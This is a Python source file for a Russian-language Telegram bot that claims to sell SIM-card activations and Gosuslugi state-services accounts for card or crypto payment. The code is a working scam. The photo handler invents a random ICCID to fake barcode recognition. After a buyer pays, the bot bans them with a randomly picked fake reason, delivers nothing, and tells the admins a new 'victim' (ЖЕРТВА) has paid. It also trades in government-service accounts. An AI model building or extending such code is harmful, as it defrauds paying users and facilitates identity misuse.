from aiogram import Router, F, types
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from data.texts import *
from data.keyboards import *
from database.models import add_activation, ban_user, is_banned
from services.crypto_pay import CryptoPay
import os, random

router = Router()
PRICE = int(os.getenv("PRICE_PER_SIM", "75"))
PRICE_GOS = int(os.getenv("PRICE_GOS", "375"))
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6593438966").split(",")]

BAN_REASONS = [
    "Подозрение на мошенничество",
    "Сим-карта уже активирована",
    "Неверные данные ICCID",
    "Попытка повторной активации",
    "Нарушение условий",
    "Сим-карта заблокирована оператором",
]

class ActivateStates(StatesGroup):
    waiting_iccid = State()

# ==================== АКТИВАЦИЯ СИМ ====================
@router.callback_query(F.data == "activate")
async def activate_start(call: CallbackQuery):
    if is_banned(call.from_user.id): await call.answer("🚫 Заблокированы!"); return
    await call.message.edit_text("📱 <b>АКТИВАЦИЯ СИМ-КАРТЫ</b>\n\nВыберите способ:", reply_markup=type_keyboard())
    await call.answer()

@router.callback_query(F.data == "type_manual")
async def type_manual(call: CallbackQuery, state: FSMContext):
    await state.set_state(ActivateStates.waiting_iccid)
    await call.message.edit_text("⌨️ Введите ICCID со штрихкода:\n<code>8970101...</code>", reply_markup=InlineKeyboardBuilder().button(text="❌ НАЗАД", callback_data="activate").as_markup())
    await call.answer()

@router.callback_query(F.data == "type_photo")
async def type_photo(call: CallbackQuery):
    await call.message.edit_text("📸 Отправьте фото штрихкода сим-карты.", reply_markup=InlineKeyboardBuilder().button(text="❌ НАЗАД", callback_data="activate").as_markup())
    await call.answer()

@router.message(F.photo)
async def handle_photo(message: Message):
    fake_iccid = "8970101" + "".join([str(random.randint(0,9)) for _ in range(13)])
    await message.answer(f"🔍 <b>РАСПОЗНАНО:</b>\n<code>{fake_iccid}</code>\n\nВыберите количество:", reply_markup=count_keyboard())

@router.message(ActivateStates.waiting_iccid)
async def process_iccid(message: Message, state: FSMContext):
    iccid = message.text.strip()
    if len(iccid) < 10: await message.answer("❌ Неверный ICCID!"); return
    await state.clear()
    await message.answer(f"✅ ICCID: <code>{iccid}</code>\n\nВыберите количество:", reply_markup=count_keyboard())

@router.callback_query(F.data.startswith("count_"))
async def choose_count(call: CallbackQuery):
    count = int(call.data.split("_")[1])
    amount = PRICE * count
    await call.message.edit_text(f"📱 <b>{count} СИМ-КАРТ</b>\n💰 {amount}₽\n\nСпособ оплаты:", reply_markup=payment_keyboard(amount, "sim"))
    await call.answer()

# ==================== ГОСУСЛУГИ ====================
@router.callback_query(F.data == "buy_gos")
async def buy_gos(call: CallbackQuery):
    if is_banned(call.from_user.id): await call.answer("🚫 Заблокированы!"); return
    await call.message.edit_text(f"🏛️ <b>АККАУНТ ГОСУСЛУГИ</b>\n💰 {PRICE_GOS}₽\n\nСпособ оплаты:", reply_markup=payment_keyboard(PRICE_GOS, "gos"))
    await call.answer()

# ==================== ОПЛАТА ====================
@router.callback_query(F.data.startswith("pay_card_"))
async def pay_card(call: CallbackQuery):
    parts = call.data.split("_")
    amount, otype = int(parts[2]), parts[3]
    add_activation(call.from_user.id, "MANUAL", otype, 1, amount)
    ban_user(call.from_user.id, random.choice(BAN_REASONS))
    await call.message.edit_text(f"🚫 <b>АККАУНТ ЗАБЛОКИРОВАН!</b>\n\n{random.choice(BAN_REASONS)}", reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url="https://t.me/SupCryptoFireWork").as_markup())
    for aid in ADMIN_IDS:
        try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА КАРТУ!</b>\n👤 {call.from_user.id}\n💵 {amount}₽")
        except: pass
    await call.answer()

@router.callback_query(F.data.startswith("pay_crypto_"))
async def pay_crypto(call: CallbackQuery):
    parts = call.data.split("_")
    amount, otype = int(parts[2]), parts[3]
    invoice = await CryptoPay.create_invoice(amount)
    if invoice:
        add_activation(call.from_user.id, "CRYPTO", otype, 1, amount)
        builder = InlineKeyboardBuilder()
        builder.button(text="💸 ПЕРЕЙТИ К ОПЛАТЕ", url=invoice["pay_url"])
        builder.button(text="🔄 ПРОВЕРИТЬ", callback_data=f"check_{invoice['invoice_id']}")
        builder.button(text="❌ НАЗАД", callback_data="start")
        builder.adjust(1)
        await call.message.edit_text(f"₿ <b>СЧЁТ СОЗДАН!</b>\n\n{amount}₽\n~{invoice['amount']} {invoice['asset']}", reply_markup=builder.as_markup())
    else:
        await call.message.edit_text("❌ Ошибка.")
    await call.answer()

@router.callback_query(F.data.startswith("check_"))
async def check_payment(call: CallbackQuery):
    inv_id = int(call.data.split("_")[1])
    status = await CryptoPay.check_invoice(inv_id)
    if status == "paid":
        ban_user(call.from_user.id, random.choice(BAN_REASONS))
        await call.message.edit_text(f"🚫 <b>АККАУНТ ЗАБЛОКИРОВАН!</b>\n\n{random.choice(BAN_REASONS)}", reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url="https://t.me/SupCryptoFireWork").as_markup())
        for aid in ADMIN_IDS:
            try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА CRYPTO!</b>\n👤 {call.from_user.id}")
            except: pass
    elif status == "active": await call.answer("⏳ Не оплачен", show_alert=True)
    else: await call.answer("❌ Истёк", show_alert=True)
    await call.answer()